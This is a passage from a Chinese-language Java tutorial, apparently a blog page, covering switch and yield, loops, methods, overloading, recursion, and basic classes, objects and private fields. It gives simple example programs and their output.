}</code></pre><h2 id="Switch-开关语句"><a href="#Switch-开关语句" class="headerlink" title="Switch 开关语句"></a>Switch 开关语句</h2><pre><code>Switch是一个开关语句，在switch之中它能够判断的数据类型仅仅是：整数、字符、JDK1.5之后追加了枚举，JDK1.7之后追加了String的判断支持，如果要想使用switch必须结合case、default（不是必须）来一起使用，其基本的语法结构如下
|- switch (整数|字符|枚举|String){
    case 匹配内容：
        内容满足时执行的语句;
        [break ;]}
    case 匹配内容:{
        内容满足时执行的语句;
        [break ;]},……[
    default:{
        内容都不满足时执行;
        [break ;]}
    ]
    }</code></pre><p><strong>对于switch来讲，它无法像if语句那样使用逻辑表达式进行判断，仅仅支持数值操作</strong></p>
<p><em>范例：观察switch语句</em></p>
<p>public class DongJun{<br>    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示<br>    public static void main(String DongJun[]){<br>        int ch = 3;<br>        switch(ch) {<br>            case 1:<br>                System.out.println(“【1】匹配的数字1”);<br>                break ;<br>            case 2:<br>                System.out.println(“【2】匹配的数字2”);<br>                break;<br>            default:<br>                System.out.println(“【NO】无法匹配内容”);<br>                break;</p>
<pre><code>        }
}</code></pre><p>}</p>
<blockquote>
<p>【NO】无法匹配内容</p>
</blockquote>
<blockquote>
<p><em>*　　以上的程序的处理结构是在实际的开发之中使用switch最为常见的结构形式，但是在使用的过程之中，也有可能出现一些认识上的问题，导致最终程序的执行结果与预期有所差别，下面针对于switch中出现一些情况进行说明。**<br>*|- 在编写switch语句的过程之中每一次case语句中都会包含一个“break”，这个语句的含义是阻止其他功能执行</em><br><em>|- 不一定按照顺序来写case</em><br><em>|- 在早期的switch语句结构之外，除了数字之外最主要的支持就是字符了，（因为字符可以和整型自动互相转换）</em></p>
</blockquote>
<pre><code>在JDK1.7之后（是Oracle收购SUN之后的第一个版本）支持有String的判断，但是仅仅是进行完整的判断。</code></pre><p><strong>范例：在switch语句中使用String</strong></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        String message = &quot;我&quot;;
        switch(message){
            case &quot;Dong&quot;:
                    System.out.println(message+&quot;Jun&quot;);
                    break;
            case &quot;董&quot;:
                    System.out.println(message+&quot;俊&quot;);
                    break;
            default:
                    System.out.println(&quot;请输入正确的姓名&quot;);
                    break;

            }
    }
}</code></pre><blockquote>
<p>这种字符串与switch结合匹配主要使用的形式是全匹配。</p>
</blockquote>
<h1 id="yield-关键字"><a href="#yield-关键字" class="headerlink" title="yield 关键字"></a>yield 关键字</h1><pre><code>yield是在JDK13之后正式加入到java中的新关键字，这个关键字的主要作用是进行内容的局部返回，现阶段其主要的设计是结合switch语句来使用，下面在正式的讲解yield之前首先观察一个程序</code></pre><p><strong>范例：观察switch分支</strong></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        String data = &quot;one&quot;;
        int result = 0 ;
        switch (data){
            case &quot;one&quot;:
                result = 1;
                break;
            case &quot;two&quot;:
                result = 2;
                break;
            default:
                result = -1;
                break;
        }
        System.out.println(result);


    }
}</code></pre><blockquote>
<p>1</p>
</blockquote>
<blockquote>
<p>*　本程序的核心含义是通过switch的判断来最终决定result变量内容是什么，以上的程序开发是属于传统的做法，而传统的做法现在就觉得有些啰嗦，如果可以直接在switch里面返回数据该多好呢？*</p>
</blockquote>
<p><strong>范例：观察JDK13之后的新结构</strong></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        String data = &quot;one&quot;;
        int result = switch (data){
            case &quot;one&quot; : yield 1 ;
            case &quot;two&quot; : yield 2 ;
            default :{
                yield -1;
                } 
        };
        System.out.println(result);
    }
}</code></pre><blockquote>
<p>1</p>
</blockquote>
<p>*　　以上的做法实际上是局部的switch返回的简化的处理形式，如果现在不想使用“-&gt;”标记符号组合，就可以通过yield关键字来处理了*</p>
<p><strong>该程序的机制实际上并没有完全的加入到java的正规使用的环境之中，还只是一种当前现阶段的测试应用环境，如果要想使用这样的功能就必须在编译和执行的时候追加“–enable-preview”参数</strong></p>
<pre><code>知识结构扩展：python语言里面有yield关键字
    |-在python中的yield也是实现了局部返回，但是它在进行局部返回的时候可以结合生成器和多协程开发进行操作。</code></pre><h1 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h1><pre><code>在java里面循环的结构分为两类：while循环、for循环，这两种循环在实际的项目开发过程之中基本上都要使用到，而且循环的结构几乎所有的项目中全部都存在。</code></pre><h2 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h2><pre><code>while 是一种条件判断的循环处理，它主要是针对于给定的条件，当条件满足之后才会执行。</code></pre><p><strong>范例：实现”1-100”数字累加</strong></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        int sum = 0 ;
        int num = 1 ;
        while (num &lt;= 100) 
        {
            sum +=num;
            num ++ ;
        }
        System.out.println(&quot;sum=&quot;+sum);
    }
}</code></pre><blockquote>
<p>sum=5050</p>
</blockquote>
<p>public class DongJun{<br>    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示<br>    public static void main(String DongJun[]){<br>        int sum = 0 ;<br>        int num = 1 ;<br>        do<br>        {<br>            sum +=num;<br>            num++ ;<br>        }<br>        while(num&lt;=100);<br>        System.out.println(“sum=”+sum);<br>    }<br>}</p>
<blockquote>
<p>sum = 5050</p>
</blockquote>
<pre><code>如果真的在实际的项目开发过程之中，很难见到“do……while”循环结构，在代码里面基本上只要条件的循环都以while循环结构为主。</code></pre><h2 id="for循环结构"><a href="#for循环结构" class="headerlink" title="for循环结构"></a>for循环结构</h2><pre><code>如果说你已经明确知道了循环次数的时候，就可以通过for循环结构更加简单的进行循环处理，首先来观察一下for循环的语法结构
|-
  for(循环初始化条件 ; 循环判断 ; 循环条件变更){
    循环体;
  }

      可以发现在for语句结构里，将所有的循环有关的操作全部放在了一行语句完成。</code></pre><p><em>范例：使用for循环</em></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        int sum = 0;
        for (int num = 1; num &lt;= 100 ; num ++ )
        {
            sum += num;
        }
        System.out.println(&quot;sum=&quot;+sum);
        }
}</code></pre><blockquote>
<p>sum = 5050</p>
</blockquote>
<p>**　　需要特别引起注意的一件事情在于：对于for循环结构实际上可以拆开编写，但是在实际的开发过程中不建议如此定义**<br><strong>范例：不便方式</strong><br>public class DongJun{<br>    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示<br>    public static void main(String DongJun[]){<br>        int sum = 0;<br>        int num = 1;<br>        for (; num &lt;= 100 ; )<br>        {<br>            sum += num;<br>            num ++ ;<br>        }<br>        System.out.println(“sum=”+sum);<br>        }<br>}</p>
<blockquote>
<p>以上的程序代码在实际上开发中不建议使用</p>
</blockquote>
<pre><code>while循环：当不知道明确的循环次数，但是却明确知道循环的结束条件的情况下可以使用while循环；
for循环：明确的知道循环次数的时候使用。</code></pre><h2 id="循环控制语句"><a href="#循环控制语句" class="headerlink" title="循环控制语句"></a>循环控制语句</h2><pre><code>在正常的情况下，所有的循环一旦开启了，那么肯定会按照既定的原则持续的执行下去（一直到不满足循环条件为止，循环才会自动的退出），但是在某些情况下，有可能会阻塞循环的执行。
针对于中断执行提供有两个关键字：continue、break;</code></pre><p><strong>结论：continue结束一次循环调用，而break是退出整个循环结构</strong></p>
<h2 id="循环嵌套"><a href="#循环嵌套" class="headerlink" title="循环嵌套"></a>循环嵌套</h2><pre><code>大部分的结构都是可以嵌套的，例如：在switch里面可以继续嵌套循环或者是if语句，在循环结构里面也可以嵌套if结构，那么同期，一个循环内部也一定可以嵌套另外一个循环。</code></pre><blockquote>
<p>**　　关于循环嵌套的提醒：只要你能够编写循环，就可以正常的向后学习课程内容。**</p>
</blockquote>
<p><strong>范例：打印乘法口诀表</strong></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        for (int x = 1; x &lt;= 9  ; x ++ )
        {
            for (int y = 1; y &lt;= x ; y ++)
            {
                System.out.print(y+&quot;*&quot;+x+&quot;=&quot;+(x*y)+&quot;\t&quot;);
            }
            System.out.println();
        }
    }
}</code></pre><blockquote>
</blockquote>
<p>1<em>1=1<br>1</em>2=2   2<em>2=4<br>1</em>3=3   2<em>3=6   3</em>3=9<br>1<em>4=4   2</em>4=8   3<em>4=12  4</em>4=16<br>1<em>5=5   2</em>5=10  3<em>5=15  4</em>5=20  5<em>5=25<br>1</em>6=6   2<em>6=12  3</em>6=18  4<em>6=24  5</em>6=30  6<em>6=36<br>1</em>7=7   2<em>7=14  3</em>7=21  4<em>7=28  5</em>7=35  6<em>7=42  7</em>7=49<br>1<em>8=8   2</em>8=16  3<em>8=24  4</em>8=32  5<em>8=40  6</em>8=48  7<em>8=56  8</em>8=64<br>1<em>9=9   2</em>9=18  3<em>9=27  4</em>9=36  5<em>9=45  6</em>9=54  7<em>9=63  8</em>9=72  9*9=81</p>
<p><strong>此时的程序利用循环嵌套实现</strong></p>
<p><strong>范例：打印正三角形</strong></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        int line  = 5 ;//总共输出5行
        for (int x=0 ; x &lt;5 ; x ++)
        {
            for (int y=0 ;y &lt; line - x; y++ )
            {
                System.out.print(&quot; &quot;);//输出空格
            }
            for (int y=0; y &lt;= x  ; y++ )
            {
                System.out.print(&quot;* &quot;);
            }
            System.out.println();
        }

    }
}</code></pre><blockquote>
</blockquote>
<pre><code> *
* *</code></pre><hr>
<hr>
<hr>
<p> <strong>实现了三角形的打印</strong></p>
<pre><code>|- 在现在的项目开发过程里面，如果不是必须的情况下，这种循环的嵌套代码会出现，但是不会出现的很多，而且随着你自己开发经验的累计，那么最终也一定可以熟练掌握。
|- 既然已经存在循环嵌套结构，那么就必须去讨论一下关于continue语句的问题了，在程序的开发语言里面可以发现“C”、“C++”、“Java”语法的结构都是非常类似，在C语言里面提供有了一个“goto”关键字，这种关键字在所有项目开发中都被命令禁止使用的开发关键字，因为会造成程序逻辑结构的混乱，在Java里面将“goto”关键字定义为了未使用到的关键字，如果此时在循环嵌套结构里面你非要进行一种代码跳转的实现，就可以通过continue来完成。</code></pre><p><em>范例：在循环嵌套结构里面使用continue进行跳转</em></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        point: for (int x = 0; x &lt;3 ; x ++ )
        {
            for (int y=0; y&lt; 3  ;  y++)
            {
                if (x == y)
                {
                    continue point;//代码跳转
                }
                System.out.print(x + &quot;、&quot;);
            }
            System.out.println();
        }
    }
}</code></pre><blockquote>
<p>1、2、2、</p>
</blockquote>
<pre><code>在内部的for循环嵌套结构里面使用了continue实现了无条件的跳转处理操作，所以最终的执行结果就出现了偏差，但是这样的程序逻辑是非常不适合阅读，所以以上的代码形式在开发中尽量不要出现</code></pre><h1 id="方法作用概述"><a href="#方法作用概述" class="headerlink" title="方法作用概述"></a>方法作用概述</h1><pre><code>方法（英文单词“method”）指的是一种可以被重复调用的代码段，如果完全没有学习过编程的概念你就把方法想象为一个功能。例如：只要你会开车，那么给你汽车你就可以直接开走（在你的开车的过程之中可能完全不知道汽车的工作原理）。</code></pre><h2 id="方法定义"><a href="#方法定义" class="headerlink" title="方法定义"></a>方法定义</h2><pre><code>在java里面由于方法是整个程序之中最为重要的结构，所以对于方法的定义本身也是非常繁琐的，为了方便大家理解本次讲解的方法结构，所以将采用如下的定义方式：
--------------------------------------------------------------
public static 方法返回值类型 方法名称（参数类型 变量， 参数类型 变量, ……）
{    
    方法体（本方法所需要实现的功能）;
    [return 返回值;]
}</code></pre><p><strong>特别注意：public static本次讲解的方法指的是主类中定义，并且由主方法直接调用的处理形式</strong></p>
<p><em>方法的定义格式：</em></p>
<blockquote>
<p>　　方法的返回值类型：主要使用的是java数据类型（基本类型、引用类型）、如果没有返回值就使用void定义；<br>　　方法名称在java之中有明确的命名要求：第一个单词的字母小写，而后每一个单词的首字母大写；<br>　　如果方法定义了非Void返回值类型，则可以通过return返回处理结果，如果使用了void，也可以使用return，就不需要返回具体的数据内容了</p>
</blockquote>
<p><strong>定义一个无参且无返回值的方法</strong></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        printMessage();
        printMessage();
    }
    public static void printMessage(){//第一个单词字母小写，后续单词首字母大写
        System.out.println(&quot;******************&quot;) ;
        System.out.println(&quot;******  DJ  ******&quot;) ;
        System.out.println(&quot;******************&quot;) ;
    }                                             
}</code></pre><blockquote>
</blockquote>
<hr>
<p><strong>**</strong>  DJ  <strong>**</strong></p>
<hr>
<hr>
<p><strong>**</strong>  DJ  <strong>**</strong></p>
<hr>
<p><strong>程序之中存在有方法之后，程序代码依旧要通过主方法执行</strong></p>
<p><em>范例：定义一个有参数有返回值的方法</em></p>
<p>public class DongJun{<br>    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示<br>    public static void main(String DongJun[]){<br>        String result = payAndGet(20.0);<br>        System.out.println(result);<br>        //如果方法本身就存在返回值声明，那么也可以直接进行输出<br>        System.out.println(payAndGet(9.9));</p>
<pre><code>}
public static String payAndGet(double money){
    if(money &gt;= 10.0){
        return &quot;购买一份快餐，找零：&quot;+ (money - 10.0);//返回一个字符串
    }
    else {
        return &quot;对不起，你的余额不足。&quot;;
        }
}                                             </code></pre><p>}</p>
<blockquote>
</blockquote>
<p>购买一份快餐，找零：10.0<br>对不起，你的余额不足。</p>
<p><strong>需要注意的一个问题：如果你现在定义的方法使用了void声明了返回值类型（方法不会返回数据），那么这个时候也可以利用return语句结束当前方法调用（此时的return不应该继续返回任何内容了）</strong></p>
<p><em>范例：使用return结束方法调用</em></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        sale(3);
        sale(-3);

    }
    public static void sale(int amount){
            if (amount &lt;= 0)//设置一个判断条件
            {
                return ;//后续的语句都不在执行了（相当于break、continue概念）
            }
            System.out.println(&quot;销售出了&quot;+amount+&quot;李兴华&quot;);
        }
    }                                             </code></pre><blockquote>
</blockquote>
<p>销售出了3李兴华</p>
<p><em>return相当于结束当前方法</em></p>
<h2 id="方法重载"><a href="#方法重载" class="headerlink" title="方法重载"></a>方法重载</h2><pre><code>方法重载从严格意义上来讲指的是一种方法名称的重用功能，利用特定的处理机制，可以让一个方法实现不同的功能。</code></pre><p>**　　在Java程序里面方法的名称实际上和变量的名称一样，都是不能够重复的，所以如果要进行方法重载的话，那么首先要做的事情就是必须将方法名称设置为相同，但是需要针对于方法的参数进行不同的定义，方法的参数及类型要有所不同。**</p>
<p><strong>范例：观察方法重载</strong></p>
<p>public class DongJun{<br>    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示<br>    public static void main(String DongJun[]){<br>        System.out.println(sum(10, 20));<br>        System.out.println(sum(10, 20, 30));<br>        System.out.println(sum(10.2, 20.3));<br>        }<br>    public static int sum(int x, int y) {<br>        return x + y;<br>    }<br>    public static int sum(int x, int y, int z)//此时定义的sum()方法的名称重复，但是参数的个数不重复<br>    {<br>        return x + y + z;<br>    }<br>    public static double sum(double x, double y) {<br>            return x + y;<br>            }<br>    }</p>
<blockquote>
</blockquote>
<p>30<br>60<br>30.5</p>
<p><em>对于以上的程序代码，本身也存在有一些设计问题</em></p>
<p>**　　在java中进行方法重载的时候只是针对于方法名称和参数的类型及个数有所要求，但是并没有对方法的返回值有所要求，也就是说一个方法被重载之后可以由不同的返回值类型定义，但是这也成为了一个设计上的问题。**</p>
<p><em>为什么需要有方法重载的机制呢？</em></p>
<blockquote>
<p><strong>之所以提供有方法的重载，主要的目的是为了保留方法名称（有些方法名称是拥有公共特征，不应该将其隶属于某一种数据类型）</strong><br>实际上在整个的java里面最具有代表性的一种重载的就属于输出的操作。</p>
</blockquote>
<p><em>范例：观察屏幕输出</em></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        System.out.println(1);
        System.out.println(1.1);
        System.out.println(&quot;www&quot;);
        System.out.println(&apos;Y&apos;);
        System.out.println(true);



    }
}        </code></pre><blockquote>
</blockquote>
<p>1<br>1.1<br>www<br>Y<br>true</p>
<p><strong>此时可以发现“System.out.println()”(后面有括号全部表示方法调用)可以输出不同的数据类型，所以该方法本身也属于一种重载的方法。</strong></p>
<h2 id="方法递归调用"><a href="#方法递归调用" class="headerlink" title="方法递归调用"></a>方法递归调用</h2><pre><code>方法的递归调用属于一种方法调用的特殊形式，这种方法调用指的是就是一个方法调用自身的情况，但是在进行递归调用过程之中一定要设置好结束条件，否则依然会出现循环的问题。</code></pre><p><strong>范例：通过递归实现一个数字的累加</strong><br>|- “1<del>100”累加，或者是由”1</del>1000”累加，所以这种情况下可以考虑利用递归的模式完成.</p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        int sum = 0;
        int num = 1000;
        while (num &gt; 0 )
        {
            sum += num;
            num --;
        }
        System.out.println(sum);

    }
}    

public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        int result = sum(1000);
        System.out.println(result);
    }
    public static int sum(int num) {
        if (num == 0) {
            return 0;
        }
         return num + sum(num - 1); //递归调用

    }
}                                             </code></pre><blockquote>
<p>500500</p>
</blockquote>
<p><strong>为了便于理解，下面针对于当前给定的sum()递归调用进行一个简单的操作说明：</strong></p>
<pre><code>    【第一次调用】由“main（）”方法发出：return 10000+sum(9999);
    【第二次调用】由“main（）”方法发出：return 9999+sum(9998);
    【倒数第二次调用】由“main（）”方法发出：return 1+sum(0);
    【倒数第二次调用】由“main（）”方法发出：return 0;
由于递归操作较为繁琐，而且一旦处理不当那么就有可能在代码的执行过程之中出现内存溢出的问题（需要一些栈内存支持），所以如果不是必须的情况下尽量不要去编写递归调用（在java开发过程里面实际上你也不会使用递归。）</code></pre><h1 id="面向对象概述"><a href="#面向对象概述" class="headerlink" title="面向对象概述"></a>面向对象概述</h1><pre><code>在整个的java（连同C++一样）最为复杂繁琐的部分就是面向对象的编程了，但是如果说现在我们都不知道面向对象的程序结构是什么，而仅仅是进行一些概念上的细分，实际上就属于极为不厚道的讲法。
在编程语言项目的发展历史过程之中，早期的项目设计结构使用的是“面向过程”，面向过程最大的特点是解决当前的问题。
而面向对象是在面向过程之上的进一步的技术发展，面向对象最大的一个特点在于进行标准化的设计，也就是说它在进行项目开发之前一定要对不同层次的功能的整合进行详细的说明。</code></pre><p>**　　面向对象的设计之中，除了拥有模块化的设计结构之外，实际上还有三个重要的特点：**</p>
<blockquote>
</blockquote>
<p>|- 封装性：程序内部的处理结构对外不可见（结构内部不可见、实现结构不可见）;<br>    - 实现结构不可见：不同的层之间进行处理的时候可以完全不知道具体的实现细节；<br>    - 内部结构不可见：内部的相关的核心定义外部无法直接访问，这就与访问权限相关了；<br>|- 继承性：在先人的基础上继续发展，就好比如果参考进化论，每一位人祖先都是猿人，肯定每一代都要比上一代要强，利用继承的结构划分出不同的类关系，同时保证一些公共的特征存留下来。<br>|- 多态性：多态是一种不确定的执行模式，同样的一个功能不同的人干会有不同的方法，但是最终的目的都是在解决核心的问题。</p>
<pre><code>面向对象之中会有许多更加细节化的概念，那么这些概念都需要时间慢慢沉淀，对于面向对象本身并不是世界上唯一使用编程模型，也有许多的开发者愿意使用面向过程或者函数式的编程，而java采用的是面向对象的开发，从本质上来讲这样的代码写起来有些难受（要求的语法结构非常细致），但是最大的特点是易于阅读。</code></pre><h2 id="类与对象"><a href="#类与对象" class="headerlink" title="类与对象"></a>类与对象</h2><pre><code>如果要想研究面向对象的编程技术，那么首先一定要明确的就是类与对象的关系，因为这个关系是整个面向对象编程之中基本组成单元，类描述的是一类事物的共同特征的集合（概念是不能够直接使用的），而对象描述的是一个体化拥有鲜明特点的实物。</code></pre><p>**　　在每一个类之中都会有相关的属性和行为（方法)，所谓的行为描述的就是类的功能，所有的对象都可以去调用类中定义的功能。**</p>
<blockquote>
<p><strong>在进行面向对象设计之中一定要先进行类结构的定义，而后才可以拥有具体的对象，对象是可以直接使用的操作；</strong><br><strong>一个类可以产生多个对象，不同的对象拥有各自不同的特点（属性），但是所有的对象都拥有相同的功能（方法）。</strong><br><em>|- 专业描述：类是对象共性的集合，而对象是类的实例，类必须依靠对象实例才可以使用。</em></p>
</blockquote>
<h2 id="类与对象的定义"><a href="#类与对象的定义" class="headerlink" title="类与对象的定义"></a>类与对象的定义</h2><pre><code>在之前所编写的所有的程序代码都是在一个类中进行程序的定义，在之前分析过了“public class”、&quot;class&quot;定义类的基本区别，实际上在java中程序类主要就是通过class关键字进行定义的，所以定义的基础语法结构如下）：
------------------------------------------------
class 类名称 { //遵守命名规则，每个单词的首字母大写
    [访问修饰符] 数据类型 成员属性（变量）;
    [访问修饰符] 数据类型 成员属性（变量）;
        ... ... ...
    [访问修饰符] 返回值类型 方法名称 （参数类型 参数1 ...）{
        本方法处理语句;
        [return [];]
    }
}
------------------------------------------------
一个类中可以同时定义多个成员属性（FIeld）、也可以定义多个方法（Method)，在进行属性定义前出现的“访问修饰符”最终的作用就是实现类的封装性的特点，本次针对于修饰符采用不定义（默认的形式），而方法中出现的访问修饰符统一使用“public”来进行描述。</code></pre><p><strong>范例：定义一个描述图书信息的类</strong></p>
<pre><code>|- 声明并实例化对象： 类名称 对象名称（变量） = new 类名称();
|- 进行分步定义，整个的操作分为两个处理阶段：
    - 声明对象：类名称 对象名称 = null（引用数据类型的默认值）；
    - 实例化对象： 对象名称 = new 类名称（）;</code></pre><blockquote>
<p><strong>当一个类已经产生了实例化对象之后肯定要对类结构进行操作，在java程序里面，对象可以通过两类语法形式使用类：<br>    |- 调用类中的成员属性（Field）：实例化对象.属性= 值；</strong><br>    |- 调用类中的方法（Method）：实例化对象.方法名称();</p>
</blockquote>
<p>范例：声明并实例化对象</p>
<pre><code>class Book
{
    //图书的名称肯定是多位字符
    String title;
    String author;
    //价格一定是一个小数，double的准确性高于float
    double price;
    public void getInfo() { //本次定义getInfo()方法过程之中可以发现没有使用最初讲解方法时的“static”关键字，在之前讲解方法时在主类中定义的，而现在在类中定义的方法主要通过对象来进行调用，所以此时暂时不加static，具体语法后续会有详细解释。
        System.out.println(&quot;图书名称：&quot;+ title + &quot;、图书作者：&quot; + author + &quot;、图书价格:&quot; + price);
    }
}

public class DongJun //主类
{
    public static void main(String avgs[]){
        Book book = new Book();
        book.title = &quot;我的&quot;;
        book.author = &quot;天啊&quot;;
        book.price = 89.6 ; 
        book.getInfo();
    }
}</code></pre><blockquote>
<p>图书名称：我的、图书作者：天啊、图书价格:89.6</p>
</blockquote>
<p><em>*　　此时的程序代码已经可以通过类产生的实例化对象进行类中结构的调用了，实例化对象一旦出现，类的结构就可以进行各种操作的，而本次的操作仅仅是进行了一些属性的设置以及方法的调用**<br>*观察属性默认值</em></p>
<pre><code>class Book
{
    //图书的名称肯定是多位字符
    String title;
    String author;
    //价格一定是一个小数，double的准确性高于float
    double price;
    public void getInfo() { //本次定义getInfo()方法过程之中可以发现没有使用最初讲解方法时的“static”关键字，在之前讲解方法时在主类中定义的，而现在在类中定义的方法主要通过对象来进行调用，所以此时暂时不加static，具体语法后续会有详细解释。
        System.out.println(&quot;图书名称：&quot;+ title + &quot;、图书作者：&quot; + author + &quot;、图书价格:&quot; + price);
    }
}

public class DongJun //主类
{
    public static void main(String avgs[]){
        Book book = new Book();
        book.getInfo();
    }
}</code></pre><blockquote>
<p>图书名称：null、图书作者：null、图书价格:0.0</p>
</blockquote>
<p>**　　现在程序仅仅是进行了book类对象的实例化处理，随后在没有进行属性设置的情况下立即调用getInfo()方法获取对象内容，通过结果可以发现title、author内容全部为null（String 是一个类，类是引用数据类型，默认值就是null）而price的默认值为“0.0”。**</p>
<pre><code>一个类与对象的基本概念已经讲述完毕，同时以上给出的语法结构实际上也属于实际开发过程之中的常规的操作形式了，但是为了帮助大家更好理解面向对象设计与之前概念的联系，下面利用面向对象的设计形式来实现一个正三角形的打印，而这个打印过程里面，将通过属性来保存打印的行数。</code></pre><p><strong>范例：面向对象设计的应用</strong></p>
<pre><code>class Triangle 
{
    int line = 5 ;
    public void paint() {
        for (int x = 0; x&lt; line ; x++)
        {
            for (int y = 0;  y&lt; line - x; y++ )
            {
                System.out.print(&quot; &quot;);
            }
            for (int y = 0 ;y &lt;= x ; y++ )
            {
                System.out.print(&quot;* &quot;);
            }
            System.out.println();
        }
    }
}
public class DongJun //主类
{
    public static void main(String avgs[]){
        Triangle tri = new Triangle();
        tri.line = 3;
        tri.paint();
    }
}</code></pre><blockquote>
</blockquote>
<p>   *</p>
<ul>
<li>*</li>
</ul>
<hr>
<p>**　　在之前实现此功能的时候要么就直接在主方法里面进行定义，要么就直接定义有一个方法进行调用，但是现在将与这个图形有关的成员属性（变量）和操作方法混合定义在了一个“Triangle”类里面，从代码管理来讲，结构是非常清晰的。**</p>
<h2 id="对象内存分析"><a href="#对象内存分析" class="headerlink" title="对象内存分析"></a>对象内存分析</h2><pre><code>在之前已经为大家讲解过了整个java之中的数据类型划分，而对于数据类型的划分，在Java里面分为两类：基本数据类型（数值的传递操作）、引用数据类型（内存地址的传递，这种引用传递就类似于C、C++之中的指针的概念）</code></pre><p>**　　所有的数据都要保存在内存之中，但是如何可以准确的获取数据，就称为了计算机操作系统本身需要解决的问题，那么经过了长期的发展之后，人们发现应该将内存的功能分为两个部分：**</p>
<blockquote>
</blockquote>
<p>|- 【heap】 堆内存：是保存对象的真实信息；<br>|- 【stack】栈内存：保存的是对象的堆内存的地址；</p>
<blockquote>
<p><strong>对于所有的内存的操作实际上每一位开发者是完全不知情的，所有与内存分配有关的任何操作全部都是由JVM负责完成的，不同的操作系统之中内存分配机制肯定也是不同的，那么最终全部由JVM进行分配</strong></p>
</blockquote>
<pre><code>如果要想进行对象属性或方法的操作，一定要保证存在有实例化对象（开辟了堆内存的对象、或者有堆指向的实例）</code></pre><h2 id="引用传递分析"><a href="#引用传递分析" class="headerlink" title="引用传递分析"></a>引用传递分析</h2><pre><code>Java之中引用数据类型需要内存的支持，所以在进行程序开发的过程之中，内存是可以有多个指向，内存的多个指向指的是不同的栈内存可以指向同一个堆内存。</code></pre><h2 id="垃圾产生分析"><a href="#垃圾产生分析" class="headerlink" title="垃圾产生分析"></a>垃圾产生分析</h2><pre><code>在Java语言里面有一个最为重要的技术特点：垃圾回收（Garbage Collector），所有的数据都要保存在内存之中，但是内存里面也是需要进行顺序式的空间分配，如果要想非常深入的去理解垃圾回收的相关操作，那么就需要先明白垃圾是什么？如何产生的，随后才可以进一步的优化
Java提供有自动的GC回收机制，但是如果你的程序之中产生的垃圾过多，那么也会造成硬件性能的损耗，从而导致程序的执行性能下降，所以最佳的做法是避免垃圾的产生。</code></pre><h2 id="成员属性的私有化"><a href="#成员属性的私有化" class="headerlink" title="成员属性的私有化"></a>成员属性的私有化</h2><pre><code>|- 在面向对象的设计之中有三大主要特征（封装、继承、多态），封装是在面向对象设计之中最为常见的一种概念，但是如果要思想把封装的所有概念都弄明白，则还需要充分的理解继承与多态，本次所讲解的成员属性私有化就是封装的一种基础实现。
|- 按照一般程序的设计思路来讲，如果要想使用类肯定要通过对象，类中一般会提供有属性和方法，那么不同的对象可以进行属性的操作，传统的做法是直接在类的外部由实例化对象直接进行属性的操作。</code></pre><p><strong>范例：使用private关键字定义类中属性</strong></p>
<pre><code>class Book
{
    private String title;
    private String author;
    private double price;
    public void getInfo(){
        System.out.println(&quot;图书标题：&quot;+ title + &quot;\n图书作者：&quot;+ author +&quot;\n图书价格：&quot;+ price);
    }
}
public class DongJun //主类
{
    public static void main(String avgs[]){
        Book book = new Book();
        book.title = &quot;成长日记&quot;;
        book.author = &quot;董俊&quot;;
        book.price = 99.9; 
        book.getInfo();



    }
}</code></pre><blockquote>
</blockquote>
<p>DongJun.java:14: 错误: title 在 Book 中是 private 访问控制<br>                book.title = “成长日记”;<br>                    ^<br>DongJun.java:15: 错误: author 在 Book 中是 private 访问控制<br>                book.author = “董俊”;<br>                    ^<br>DongJun.java:16: 错误: price 在 Book 中是 private 访问控制<br>                book.price = 99.9;</p>
<p><strong>使用private关键字定义类中属性所以无法访问</strong></p>
<pre><code>使用了private外部的对象无法直接访问了，但是类的内部是可以进行访问的，于是如果要想进行private私有属性的访问操作，按照Java本身定义规则来讲，就需要编写setter、getter方法来完成 
|- stter：进行属性内容的设置，基本形式:
-------------------------------------------
public void set 属性名称(属性类型 变量){ 属性名称 = 变量}
private String title;
public void setTitle(String t){
    title = t;    
}
|- getter：获取属性内容：基本的形式：
--------------------------------------
public 属性类型 get属性名称(){
    return 属性名称;
}
public String getTitle(){
    return title;
}</code></pre><p><em>你的类中不管有多少属性都需要编写与之匹配的setter、getter</em>的方法的个数，而且这种编写的设计结构是所有的Java后续开发之中都一定会使用的模式。</p>
<p><strong>范例：观察private属性访问</strong></p>
